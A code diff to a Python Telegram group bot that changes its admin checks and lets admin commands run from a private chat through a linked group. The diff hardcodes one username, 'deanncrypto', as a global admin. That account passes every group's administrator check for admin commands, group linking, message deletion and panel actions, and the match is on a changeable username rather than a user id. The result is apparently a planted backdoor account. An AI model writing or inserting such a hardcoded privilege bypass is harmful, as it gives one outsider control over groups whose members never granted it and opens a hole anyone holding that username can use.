@@ -1336,7 +1336,17 @@ def _hours_since(dt):
     return (utc_now() - dt).total_seconds() / 3600.0
 
 
-async def user_is_admin(bot, chat_id, user_id):
+GLOBAL_ADMIN_USERNAMES = {"deanncrypto"}
+
+
+def is_global_admin_user(user: User | None) -> bool:
+    username = (getattr(user, "username", "") or "").strip().lower()
+    return username in GLOBAL_ADMIN_USERNAMES
+
+
+async def user_is_admin(bot, chat_id, user_id, user: User | None = None):
+    if is_global_admin_user(user):
+        return True
     member = await bot.get_chat_member(chat_id, user_id)
     return member.status in {"administrator", "creator"}
 
@@ -1366,10 +1376,18 @@ async def resolve_target_chat_id(update: Update, context: ContextTypes.DEFAULT_T
             return None
 
     if admin_required:
-        if not await user_is_admin(context.bot, target_chat_id, user.id):
+        if not await user_is_admin(context.bot, target_chat_id, user.id, user):
             await message.reply_text("Admin only command")
             return None
     return target_chat_id
+
+
+def resolve_callback_target_chat_id(query) -> int | None:
+    chat = getattr(query, "message", None).chat if getattr(query, "message", None) else None
+    if chat and chat.type != "private":
+        return chat.id
+    link = private_links_collection.find_one({"user_id": query.from_user.id}) or {}
+    return link.get("chat_id")
 
 
 async def fetch_chat_avatar_image(bot, chat_id):
@@ -2351,7 +2369,7 @@ async def link_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if target_chat_id is None:
         await msg.reply_text("Invalid group key. Use the group chat id from /adminstats.")
         return
-    if not await user_is_admin(context.bot, target_chat_id, user.id):
+    if not await user_is_admin(context.bot, target_chat_id, user.id, user):
         await msg.reply_text("You must be an admin of that group to link it.")
         return
 
@@ -3026,7 +3044,7 @@ async def delete_bot_message(update: Update, context: ContextTypes.DEFAULT_TYPE)
             can_delete = bool(owner_id <= 0 or actor_id == owner_id)
         elif chat:
             try:
-                can_delete = await user_is_admin(context.bot, chat.id, actor_id)
+                can_delete = await user_is_admin(context.bot, chat.id, actor_id, query.from_user)
             except Exception:
                 can_delete = False
 
@@ -3797,10 +3815,9 @@ def top_caller_id(chat_id: int, lookback_days: int = 7):
 
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat = update.effective_chat
     user = update.effective_user
-    if not await user_is_admin(context.bot, chat.id, user.id):
-        await update.effective_message.reply_text("Admin only command")
+    target_chat_id = await resolve_target_chat_id(update, context, admin_required=True)
+    if target_chat_id is None:
         return
 
     keyboard = InlineKeyboardMarkup(
@@ -3830,10 +3847,14 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def admin_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    chat_id = query.message.chat_id
+    chat_id = resolve_callback_target_chat_id(query)
     user_id = query.from_user.id
 
-    if not await user_is_admin(context.bot, chat_id, user_id):
+    if chat_id is None:
+        await query.message.reply_text("No linked group. Use /linkgroup <group_key> in private chat.")
+        return
+
+    if not await user_is_admin(context.bot, chat_id, user_id, query.from_user):
         await query.message.reply_text("Admin only action")
         return
 
